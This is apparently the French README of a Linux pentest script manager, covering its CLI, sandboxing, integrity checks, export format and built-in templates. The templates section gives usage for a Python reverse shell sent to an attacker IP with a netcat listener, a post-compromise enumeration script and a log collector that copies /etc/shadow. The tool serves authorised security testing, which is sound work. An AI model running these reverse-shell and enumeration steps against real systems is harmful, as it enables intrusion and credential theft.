# GS-CYBERsecu

**Gestionnaire de scripts pour la cybersécurité et le pentest sous Linux.**

> 🇫🇷 Français · [🇬🇧 English](README.en.md)

Aucune dépendance requise. Fonctionne sur toutes les distributions Linux avec Python 3.10 ou supérieur.

<br>

## Fonctionnalités

| Fonctionnalité | Détails |
|---|---|
| Organisation des scripts | Catégories : `recon`, `exploit`, `post-exploit`, `forensic`, `custom` |
| Recherche avancée | Filtres par mot-clé, tags (logique ET), catégorie, langage, date, dépendances, auteur |
| Exécution sécurisée | Sandboxing Firejail ou Docker avec détection automatique |
| Vérification des dépendances | Binaires système, packages Python, Go, Ruby gems, commandes personnalisées |
| Intégrité SHA256 | Empreinte calculée à l'enregistrement, vérifiée systématiquement avant chaque exécution |
| Codes d'erreur précis | Timeout (124), interpréteur absent (127), permission refusée (126), fichier introuvable (3) |
| Historique d'exécution | Base SQLite + logs texte quotidiens, export JSON et CSV |
| Templates intégrés | 8 templates prêts à l'emploi, générables en un seul fichier exécutable |
| Export / Import | Archive JSON portable avec contenu des fichiers encodé en base64 |
| Interface CLI | Basé sur `argparse` de la bibliothèque standard, sans dépendance externe |
| Interface graphique | GUI Tkinter intégré à Python (`gscs gui`) |
| Configuration | Fichiers JSON ou YAML avec surcharge par projet et variables d'environnement |

<br>

## Installation

> Le package n'est pas encore publié sur PyPI. Installe-le depuis les sources.

### Kali / Parrot / BlackArch — méthode recommandée

```bash
sudo apt install pipx
pipx ensurepath

git clone https://github.com/mirtus-git/gs-cybersecu
cd gs-cybersecu
pipx install .
```

Avec sortie colorée et support YAML :

```bash
pipx install ".[all]"
```

### Toutes distributions via venv

```bash
git clone https://github.com/mirtus-git/gs-cybersecu
cd gs-cybersecu

python3 -m venv .venv
source .venv/bin/activate
pip install .

gscs --help
```

### Mode développement

```bash
git clone https://github.com/mirtus-git/gs-cybersecu
cd gs-cybersecu

python3 -m venv .venv
source .venv/bin/activate
pip install -e ".[dev]"
pytest tests/
```

<br>

## Prise en main rapide

```bash
# Enregistrer un script
gscs add /opt/scripts/nmap_scan.sh --category recon --tags "nmap,port-scan" --desc "Scanner de ports"

# Lister tous les scripts
gscs list

# Rechercher par mot-clé ou tag
gscs search nmap
gscs search --category recon --tag nmap --tag stealth

# Exécuter un script (sandboxé avec Firejail si disponible)
gscs run nmap_scan --args "-sV 192.168.1.0/24"

# Vérifier les dépendances
gscs deps check nmap_scan

# Consulter l'historique
gscs history --last 20
gscs history --export csv --output logs.csv

# Supprimer un script
gscs remove nmap_scan

# Lancer l'interface graphique
gscs gui

# Générer un script depuis un template
gscs template list
gscs template use recon/nmap -o /opt/scripts/nmap_quick.sh --register

# Exporter / importer la bibliothèque
gscs export -o ma_librairie.json
gscs import ma_librairie.json --skip-existing
```

<br>

## Référence des commandes

```
gscs add <chemin>         Enregistre un script
  -n, --name              Nom du script (défaut : nom du fichier)
  -c, --category          recon | exploit | post-exploit | forensic | custom
  -l, --lang              python | bash | go | ruby | perl | other
  -t, --tags              Tags séparés par des virgules
  -d, --desc              Description courte
      --deps              Dépendances (ex: "nmap,python:requests")
  -u, --update            Met à jour si le script existe déjà
      --no-hash           Ne pas calculer l'empreinte SHA256

gscs search [mot-clé]     Recherche avec filtres
  -c, --category
  -t, --tag               Répétable, logique ET
  -l, --lang
      --after, --before   Filtres de date AAAA-MM-JJ
      --dep               Filtrer par dépendance
  -f, --format            table | json

gscs run <nom>            Exécute un script
      --args "..."        Arguments à transmettre au script
      --sandbox           auto | firejail | docker | none
      --dry-run           Affiche la commande sans l'exécuter
      --force             Exécute sans sandbox

gscs list                 Liste tous les scripts
gscs info <nom>           Détails complets d'un script
gscs history              Journal d'exécution
gscs deps check <nom>     Vérifie les dépendances
gscs deps install <nom>   Affiche les commandes d'installation
gscs remove <nom>         Supprime un script
gscs gui                  Lance l'interface graphique

gscs template list [mot-clé]   Liste les templates disponibles
gscs template show <nom>       Prévisualise le contenu d'un template
gscs template use <nom> -o <fichier>
                               Génère un script depuis un template
      --register               Enregistre automatiquement dans la bibliothèque
      --force                  Écrase si le fichier existe déjà

gscs export                    Exporte la bibliothèque en archive JSON
  -o, --output                 Fichier de sortie (défaut : stdout)
  -c, --category               N'exporter qu'une catégorie
      --no-content             Métadonnées uniquement (sans les fichiers)

gscs import <archive>          Importe depuis une archive JSON
      --skip-existing          Ignore les scripts déjà enregistrés
      --update                 Écrase les existants sans confirmation
      --no-restore             Ne pas restaurer les fichiers depuis l'archive
      --dry-run                Prévisualise sans appliquer les changements
```

<br>

## Templates intégrés

Les templates sont des scripts prêts à l'emploi, personnalisables, couvrant les phases classiques d'un pentest.

```bash
gscs template list                       # voir tous les templates
gscs template show recon/nmap            # prévisualiser
gscs template use recon/nmap -o /opt/scripts/nmap_recon.sh --register
```

### `recon/nmap` — Reconnaissance Nmap multi-phases (niveau professionnel)
**Langage :** bash | **Dépendance :** `nmap >= 7.80` | **Optionnel :** `xsltproc`, `root`

Script de reconnaissance complet en **6 phases indépendantes**. Chaque phase sauvegarde ses résultats en formats `.nmap`, `.gnmap`, `.xml` et `.html` (si `xsltproc` est disponible). Conçu pour être utilisé directement en mission de pentest ou audit réseau.

**Phases :**

| Phase | Contenu | Root requis |
|---|---|---|
| 1 | Host discovery (ping sweep) | non |
| 2 | TCP port scan (profondeur selon `--mode`) | non (Connect) / oui (SYN) |
| 3 | Service & version detection (`-sV --version-intensity 7`) | non |
| 4 | NSE scripts (`default,banner` ; `+vuln` en mode `vuln`) | non |
| 5 | OS fingerprinting (`-O --osscan-guess`) | **oui** (`--os`) |
| 6 | UDP top-200 scan | **oui** (`--udp`) |

**5 modes de scan :**

| Mode | Ports | Timing | Scripts | Durée estimée |
|---|---|---|---|---|
| `quick` | top 1000 | T4 | aucun | ~1 min |
| `standard` | top 5000 | T4 | default+banner | ~5 min |
| `full` | 65535 | T4 | default+banner | ~20 min |
| `stealth` | top 5000 | T2 | aucun + `-f` + random | ~15 min |
| `vuln` | top 5000 | T4 | default+banner+vuln | ~30 min |

**Exemples :**

```bash
# Scan standard sur une cible unique
./nmap_recon.sh 192.168.1.1

# Scan complet avec OS et UDP (root requis)
sudo ./nmap_recon.sh -m full --os --udp 192.168.1.1

# Scan furtif sur un sous-réseau complet
sudo ./nmap_recon.sh -m stealth -T2 --no-ping 10.10.10.0/24

# Audit vulnérabilités avec rapport dans un dossier dédié
./nmap_recon.sh -m vuln -o /tmp/audit_client 10.0.0.0/24

# Ports personnalisés avec scripts ciblés
./nmap_recon.sh -p 80,443,8080-8090 --scripts "http-title,ssl-cert" 192.168.0.1

# Voir les commandes sans les exécuter (dry-run)
./nmap_recon.sh -m full --os --udp --dry-run 10.10.14.5
```

**Arborescence des fichiers produits :**

```
recon_192.168.1.1_20260323_142500/
├── p1_discovery.{nmap,gnmap,xml,html,log}
├── p2_portscan.{nmap,gnmap,xml,html,log}
├── p3_services.{nmap,gnmap,xml,html,log}
├── p4_scripts.{nmap,gnmap,xml,html,log}
├── p5_os.{nmap,gnmap,xml,html,log}      (si --os)
└── p6_udp.{nmap,gnmap,xml,html,log}     (si --udp)
```

---

### `exploit/revshell-python` — Reverse shell Python
**Langage :** python | **Dépendance :** aucune

> **Réservé aux tests autorisés uniquement.**

Se connecte en TCP à l'IP/port de l'attaquant et exécute les commandes reçues. Gère les timeouts par commande (30 s) et les erreurs de sortie.

```bash
# Sur la machine cible (après obtention d'une RCE)
python3 revshell.py 10.10.14.5 4444

# Sur la machine attaquante
nc -lvnp 4444
```

---

### `post-exploit/sysinfo` — Collecte d'informations système
**Langage :** bash | **Dépendance :** aucune

Rassemble en une passe les informations utiles après compromission : utilisateur courant, interfaces réseau, ports en écoute, droits sudo, binaires SUID, crontabs, variables d'environnement.

```bash
./sysinfo.sh
# === SYSTEM ===
# Linux kali 6.x.x-kali ...
# === SUDO RIGHTS ===
# (root) NOPASSWD: /usr/bin/vim
# === SUID BINARIES ===
# /usr/bin/sudo  /usr/bin/passwd ...
```

---

### `post-exploit/persistence-check` — Détection des mécanismes de persistance
**Langage :** bash | **Dépendance :** aucune

Inspecte les emplacements classiques de persistance Linux : crontabs de tous les utilisateurs, services systemd non-standard, scripts d'initialisation, fichiers `.bashrc`/`.profile`, `authorized_keys`, binaires SUID/SGID.

```bash
./persistence_check.sh
# === SYSTEMD SERVICES (non-standard) ===
# backdoor.service  loaded active running ...
# === AUTHORIZED KEYS ===
# --- /home/user/.ssh/authorized_keys ---
# ssh-rsa AAAA... attacker@kali
```

---

### `forensic/log-collect` — Collecte de logs pour analyse forensique
**Langage :** bash | **Dépendance :** aucune

Crée un répertoire horodaté et y copie : logs `/var/log`, journal systemd, liste des processus, connexions réseau, sessions actives (`last`, `who`), `/etc/passwd`, `/etc/shadow`. Génère un manifeste SHA256 de tous les fichiers collectés.

```bash
./log_collect.sh /mnt/usb/forensic_2026-03-23
# [*] Collecting to /mnt/usb/forensic_2026-03-23
# [+] Collection complete
# [+] Manifest: /mnt/usb/forensic_2026-03-23/MANIFEST.sha256
```

---

### `custom/skeleton-bash` — Squelette de script Bash
**Langage :** bash | **Dépendance :** aucune

Modèle de départ pour un script Bash robuste : `set -euo pipefail`, parsing d'arguments avec `getopts`, fonctions `log/ok/err/dbg`, usage automatique.

```bash
./mon_script.sh -v -o results.txt cible.exemple.com
```

---

### `custom/skeleton-python` — Squelette de script Python
**Langage :** python | **Dépendance :** aucune (stdlib uniquement)

Modèle de départ pour un script Python : `argparse` avec `--verbose` et `--output`, logging formaté avec horodatage, structure `main() → int` propre.

```bash
python3 mon_script.py --verbose -o results.txt cible.exemple.com
```

<br>

## Export / Import

L'export produit une archive JSON autonome contenant les métadonnées **et le contenu** des fichiers (encodé en base64). L'import restaure les fichiers et ré-enregistre les scripts en une seule commande.

```bash
# Exporter toute la bibliothèque
gscs export -o librairie.json

# Exporter uniquement la catégorie recon
gscs export -o recon.json --category recon

# Exporter sans le contenu des fichiers (métadonnées uniquement)
gscs export -o meta.json --no-content

# Voir ce qui serait importé sans rien modifier
gscs import librairie.json --dry-run

# Importer (demande confirmation pour les scripts existants)
gscs import librairie.json

# Importer sans écraser les scripts déjà présents
gscs import librairie.json --skip-existing

# Importer et écraser tous les scripts existants
gscs import librairie.json --update
```

Format de l'archive :

```json
{
  "gscs_archive_version": "1",
  "gscs_version": "0.1.0",
  "exported_at": "2026-03-23T12:00:00+00:00",
  "script_count": 3,
  "scripts": [
    {
      "name": "nmap_scan",
      "category": "recon",
      "language": "bash",
      "tags": "nmap, port-scan",
      "dependencies": "[\"nmap\"]",
      "sha256": "a3f1...",
      "content_b64": "IyEvdXNy..."
    }
  ]
}
```

<br>

## Intégrité SHA256 et codes d'erreur

À chaque exécution, `gscs run` vérifie automatiquement que le script n'a pas été modifié depuis son enregistrement.

| Situation | Message | Code de sortie |
|---|---|---|
| Script introuvable sur disque | `FILE NOT FOUND` + commande de ré-enregistrement | 3 |
| Hash SHA256 différent de celui enregistré | `INTEGRITY FAILURE` + hash attendu | 2 |
| Aucun hash enregistré (`--no-hash`) | Avertissement, exécution continue | — |
| Dépendance manquante | `DEPENDENCY ERROR` + commandes d'installation | 1 |
| Sandbox demandé non disponible | Avertissement + suggestion d'installation | 1 |
| Interpréteur absent du PATH | `INTERPRETER NOT FOUND` + hint d'installation | 127 |
| Permission refusée sur le fichier | `PERMISSION DENIED` + `chmod +x` | 126 |
| Timeout dépassé | `TIMEOUT` + durée configurée | 124 |
| Erreur dans le script | `FAILED: script exited with code N` | N |

Les raisons de chaque échec sont enregistrées dans le champ `notes` de l'historique SQLite.

<br>

## Format des dépendances

Lors de l'ajout d'un script avec `--deps` :

| Format | Vérification effectuée |
|---|---|
| `nmap` | Binaire système (`which nmap`) |
| `python:requests` | Package Python (`importlib`) |
| `go:subfinder` | Binaire Go dans le PATH |
| `ruby:nokogiri` | Gem Ruby |
| `cmd:ma commande` | Commande shell arbitraire (code retour 0 = OK) |

<br>

## Sandboxing

La détection automatique suit cet ordre de priorité :

1. **Firejail** — léger, profils par catégorie, isolation réseau
2. **Docker** — isolation complète en conteneur, image configurable par langage
3. **Aucun** — nécessite le flag `--force`

Installer Firejail pour de meilleurs résultats :

```bash
sudo apt install firejail     # Debian / Ubuntu / Kali
sudo dnf install firejail     # Fedora / RHEL
sudo pacman -S firejail       # Arch / BlackArch
```

<br>

## Configuration

Le fichier de configuration est créé automatiquement dans `~/.config/gscs/config.json` au premier lancement.

```json
{
  "storage": {
    "scripts_dir": "~/.local/share/gscs/scripts",
    "db_path": "~/.local/share/gscs/gscs.db",
    "logs_dir": "~/.local/share/gscs/logs",
    "log_retention_days": 90
  },
  "execution": {
    "sandbox": "auto",
    "timeout": 300,
    "require_force_no_sandbox": true
  }
}
```

Variables d'environnement disponibles :

| Variable | Effet |
|---|---|
| `GSCS_DB_PATH` | Chemin vers la base de données |
| `GSCS_SCRIPTS_DIR` | Répertoire des scripts |
| `GSCS_SANDBOX` | Mode de sandboxing |
| `GSCS_TIMEOUT` | Timeout d'exécution en secondes |

Pour une surcharge au niveau projet, crée un fichier `.gs-cybersecu.json` dans ton répertoire de travail.

<br>

## Prérequis

Python 3.10 ou supérieur suffit. Tout le reste est optionnel.

| Composant | Usage |
|---|---|
| `rich` | Sortie terminal colorée (`pipx install ".[rich]"`) |
| `pyyaml` | Support des fichiers de config YAML (`pipx install ".[yaml]"`) |
| `firejail` ou `docker` | Exécution sandboxée |
| `python3-tk` | Interface graphique (`sudo apt install python3-tk`) |

<br>

## Licence

MIT © 2026 mirtus-git
